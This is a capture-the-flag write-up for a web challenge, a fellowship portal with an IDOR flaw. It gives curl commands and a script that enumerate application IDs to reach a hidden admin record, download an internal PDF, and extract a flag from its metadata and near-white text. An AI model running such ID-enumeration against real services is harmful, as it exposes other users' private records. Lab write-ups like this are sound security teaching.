---
title: "The Missing Application"
category: "Web"
tags: ["broken-access-control", "idor", "pdf"]
solve_date: "2026-10-10T20:03:00+07:00"
language: "en"
points: 200
---

# The Missing Application

**Flag:** `foobarnitd{1d0r_ch41ns_l34d_t0_h1dd3n_d0cs}`
**Service:** `http://54.87.116.237:5001` (Flask + gunicorn, server-rendered, shared instance)

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| `internal_review.pdf` (from `/documents/7341/download`) | 2,049 | `9f8764958d692b171b30f08123dfb5ce781a9923a21bb97da27623d6ecaf06d3` |

## Challenge

> A college has launched an online portal where students can apply for a prestigious technology
> fellowship. You register as a normal applicant and explore the portal, where you can submit
> applications, view your details, and track your application status.
>
> However, something doesn't add up. One application has mysteriously disappeared from the public
> dashboard, and rumours suggest that it contains a message the administrator never intended to
> reveal.

Hint: *Sometimes the browser shows you less than the server does.* Flag format `foobarnitd{...}`.

## Analysis

The application exposes four public routes: `/`, `/register`, `/login`, `/logout`; `/dashboard` returns
`302` without a session. Probing `/admin`, `/debug`, `/api`, `/api/applications`, `/robots.txt`,
`/.env`, `/.git/HEAD` and `/flag.txt` all return the default Werkzeug `404`, so there is no hidden route
at the name level.

The first session cookie after registration:

```text
session=eyJhcHBsaWNhdGlvbl9pZCI6MTA4NiwidXNlcl9pZCI6Mzl9.aso2qw.y_tMtjWtSSHxvEq1duUoZNlOyuU
```

The base64 payload decodes to `{"application_id":1086,"user_id":39}` (decoding the payload needs no
secret key; the signature authenticates the cookie but is not verified here). The two identifiers are far
apart: the 39th account maps to application 1086, so `application_id` is not issued per user lifecycle
and most applications belong to no account — the data is pre-seeded.

`/dashboard` renders only the logged-in user's own application: the HTML embeds
`fetch("/api/application/1086")` and prints the whole JSON into a `<pre>` element. The UI has no public
list page at all, so the API is where the real data lives.

`GET /api/application/<id>` uses the id taken from the URL and never compares it with `application_id` in
the session, so any application record can be read:

```text
/api/application/1001 -> {"id":1001,"internal_note":"Automated note: application 1001 processed normally.","name":"rahul_sharma","status":"pending"}
/api/application/1079 -> {"id":1079,"internal_note":"Thank you for applying to the fellowship.","name":"testuser1","status":"pending"}
/api/application/1     -> {"error":"application not found"}
```

Forcing the API to return more through query parameters (`?id=`, `?application_id=`, `?all=1`,
`?hidden=1`, `?internal=true`, `?debug=1`) on your own record always returns that same record; the
server ignores the parameters. A "the API leaks an extra column" path therefore does not apply here —
what is hidden is an entire record, not one field.

Enumerating `990..1087` shows the data layout: `1001..1047` is a contiguous seeded range whose
`internal_note` follows the template `Automated note: application <id> processed normally.`, while `1048`
onward are accounts created by other teams during the event (`1088` and above did not exist yet). Inside
the seeded range exactly one record deviates from the template:

```json
{"document":"/api/documents/7341","id":1047,"internal_note":"Application withdrawn pending internal review. See attached document.","name":"admin","status":"withdrawn"}
```

`#1047` has `name: admin`, `status: withdrawn`, and it is the only record carrying an extra `document`
key — that key appears in no other JSON in `1001..1047`. This is the disappeared application: the UI
never lists it anywhere, but the API still returns it in full.

`GET /api/documents/7341` returns `401 {"error":"authentication required"}` without a session and `200`
with one:

```json
{"download":"/documents/7341/download","filename":"internal_review.pdf"}
```

Document references are not sequential: `/api/documents/1`, `/api/documents/7340` and
`/api/documents/7342` all return `document not found`, so the value `7341` can only be obtained from
record `#1047` itself.

## Solution

The chain is two object-level authorization failures in sequence, plus a file read:

1. **`/api/application/<id>` omits the ownership check** — the URL id is used directly as the lookup key.
   Because application ids are a global counter and the UI lists nothing beyond your own record, walking
   the solution enumerates the ID range to locate the record hidden from the UI.
2. **Seeded record `#1047` exposes an internal document link.** The `document` key present only in this
   record supplies the reference showing that `/api/documents/<id>` exists.
3. **`/documents/7341/download` returns the internal PDF**, `Content-Type: application/pdf`,
   `Content-Length: 2049`.

The PDF holds the flag in two independent places; neither stands out when the file is opened in an
ordinary PDF viewer:

- The file's Info dictionary stores the flag in `/Keywords`:

```text
<<
/Author (NIT Durgapur Fellowship Committee) /CreationDate (D:20261010103328+00'00') /Creator (ReportLab PDF Library - www.reportlab.com) /Keywords (internal-use-only flag=foobarnitd{1d0r_ch41ns_l34d_t0_h1dd3n_d0cs}) /ModDate (D:20261010103328+00'00') /Producer (ReportLab PDF Library - www.reportlab.com)
  /Subject (Internal Review) /Title (Internal Review - Application 1047) /Trapped /False
>>
```

- The page content stream (object `8 0 obj`) draws one line in a near-white color, set by
  `.97 .97 .97 rg` immediately after the sentence "This document is for internal committee use only."
  (`.` = RGB gray 0.97, close to the page background, so it is hard to see on the rendered page):

```text
.97 .97 .97 rg
BT /F1 10 Tf 12 TL ET
BT 1 0 0 1 72 491.8898 Tm (audit-ref:foobarnitd{1d0r_ch41ns_l34d_t0_h1dd3n_d0cs}) Tj T* ET
```

The visible page text matches what `internal_note` described: the application was withdrawn before the
review deadline and removed from the dashboard pending an internal audit. The two copies of the flag are
identical character by character.

## Result

```text
foobarnitd{1d0r_ch41ns_l34d_t0_h1dd3n_d0cs}
```

The flag was read directly from the PDF artifact downloaded from the service, confirmed by two independent
locations in the same file (`/Keywords` and the near-white text in the content stream). No submission
response was recorded.

## Reproduce

Requires `curl`, `python3` (stdlib only: `base64`, `re`, `zlib`) and a running instance. Every request is a
`GET` except one `POST /register` used to obtain a session.

```bash
B=http://54.87.116.237:5001
export MSYS_NO_PATHCONV=1   # Git Bash on Windows: keep arguments that start with / intact

# 1. Register an ordinary applicant and keep the session cookie
curl -sS -c jar.txt -X POST "$B/register" -d "username=viewer&password=viewerpass"
curl -sS -b jar.txt "$B/dashboard" | grep -E 'application ID|api/application'

# 2. Read the session payload (no secret key needed)
awk '$6=="session"{print $7}' jar.txt | cut -d. -f1 | base64 -d; echo

# 3. Enumerate the seeded application range, keep the records that deviate from the template
seq 990 1087 | xargs -P 6 -I{} sh -c \
  'curl -sS -b jar.txt --max-time 10 "'"$B"'/api/application/{}" | sed "s/^/{} /"' >> all.jsonl
grep '"error"' all.jsonl | awk '{print $1}' | tr '\n' ' '; echo
grep -v '"error"' all.jsonl | grep -v 'Automated note: application [0-9]* processed normally\.' | sort -n

# 4. Take the document link from record 1047 and download the PDF
curl -sS -b jar.txt "$B/api/documents/7341"
curl -sS -b jar.txt -o internal_review.pdf "$B/documents/7341/download"

# 5. Flag present in the raw PDF (metadata) and in the content stream
grep -a -o 'foobarnitd{[^}]*}' internal_review.pdf
```

To read the compressed page content, save the following fenced block as `read_pdf.py` and run
`python read_pdf.py internal_review.pdf`:

```python
import base64, re, sys, zlib

raw = open(sys.argv[1], "rb").read()

# Info dictionary: /Keywords is not rendered by a PDF viewer
for obj in re.finditer(rb'\d+ 0 obj(.*?)endobj', raw, re.S):
    if b'/Keywords' in obj.group(1):
        print(obj.group(1).decode('latin-1'))

# Page content stream: ASCII85Decode + FlateDecode
for obj in re.finditer(rb'\d+ 0 obj(.*?)endobj', raw, re.S):
    body = obj.group(1)
    if b'/Filter' in body and b'stream' in body:
        data = re.search(rb'stream\r?\n(.*?)endstream', body, re.S).group(1).strip().rstrip(b'~>')
        print(zlib.decompress(base64.a85decode(data)).decode('latin-1'))
```

```text
/Keywords (internal-use-only flag=foobarnitd{1d0r_ch41ns_l34d_t0_h1dd3n_d0cs})
...
.97 .97 .97 rg
BT 1 0 0 1 72 491.8898 Tm (audit-ref:foobarnitd{1d0r_ch41ns_l34d_t0_h1dd3n_d0cs}) Tj T* ET
```

Two notes for a rerun: `xargs -P` can drop one output line because concurrent `curl` processes interleave
their writes (in this recording id `1014` had to be queried again separately — it does exist, it is not a
gap), and a shared instance will contain higher application ids created by other teams, so bound the
enumeration by the id of the account you just created.
